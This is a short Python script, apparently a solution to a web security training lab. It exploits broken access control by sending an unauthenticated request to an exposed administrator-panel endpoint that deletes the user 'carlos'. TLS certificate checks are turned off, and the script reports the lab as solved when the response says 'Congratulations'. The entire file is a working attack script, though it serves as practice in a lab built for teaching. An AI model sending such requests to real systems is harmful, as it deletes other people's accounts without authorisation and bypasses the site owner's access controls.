#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_carlos(s, url):
    delete_url = url + "/administrator-panel/delete?username=carlos"
    r = requests.get(delete_url, verify=False)
    if "Congratulations" not in r.text:
        print("[-] Error deleting Carlos...")
        sys.exit(1)   
    print("[+] Deleted Carlos... Lab solved")    

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(1)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    delete_carlos(s, url)

if __name__=="__main__":
    main()